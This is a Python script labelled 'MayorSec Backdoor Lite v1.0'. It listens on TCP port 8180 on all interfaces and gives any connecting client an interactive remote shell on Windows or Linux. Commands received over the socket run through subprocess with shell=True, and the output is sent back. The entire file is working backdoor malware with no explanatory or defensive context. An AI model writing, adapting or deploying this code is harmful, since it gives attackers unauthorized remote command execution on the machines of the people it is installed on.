#!/usr/bin/env python3
import socket
import os
import sys
import subprocess
import threading
import time
from datetime import datetime
hostIP = '0.0.0.0'
hostPort = 8180
banner = (b"""
================================================
               MayorSec Backdoor
                     Lite               
                     v1.0               
================================================
""")
time.sleep(1)
a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
a.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
a.bind((hostIP, hostPort))
print("Listening for client connections...")
def main(): 
    class ClientThread(threading.Thread):
        def __init__(self,clientAddress,clientsocket):
            threading.Thread.__init__(self)
            self.csocket = clientsocket
        def run(self):
            while True:
                self.csocket.send(banner)
                time.sleep(1)
                h_name = socket.gethostname()
                self.csocket.send(b"Successfully connected to " + h_name.encode() + b".\n\n")          
                while True:
                    if sys.platform.startswith('win32'):
                        curDir = os.getcwd()
                        h_name = socket.gethostname()
                        h_time = datetime.now().time()
                        lineButton = ">"
                        self.csocket.send(curDir.encode() + lineButton.encode())
                        data = self.csocket.recv(1024).decode("utf-8")
                        if data.split(" ")[0] == "cd":
                            data = (data).strip()
                            os.chdir(data.split(" ")[1])
                            self.csocket.send(bytes("\n".format(os.getcwd()).encode()))                         
                                    
                        else:    
                            command = data
                            p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
                            output = p.stdout.read()
                            self.csocket.send(bytes(output))
                    elif sys.platform.startswith('linux'):
                        curDir = os.getcwd()
                        curUser = os.getlogin()
                        h_name = socket.gethostname()
                        h_time = datetime.now().time()
                        lineButton = ">"
                        nameSet = "@"
                        self.csocket.send(curUser.encode()+ nameSet.encode() + h_name.encode() + curDir.encode() + lineButton.encode())
                        data = self.csocket.recv(1024).decode("utf-8")
                        if data.split(" ")[0] == "cd":
                            data = (data).strip()
                            os.chdir(data.split(" ")[1])
                            self.csocket.send(bytes("\n".format(os.getcwd()).encode()))    
                        else:    
                            command = data
                            p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
                            output = p.stdout.read()
                            self.csocket.send(bytes(output))                                

    while True:
        a.listen(1000)
        clientsock, clientAddress = a.accept()
        newthread = ClientThread(clientAddress, clientsock)
        newthread.start()
if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        quit()        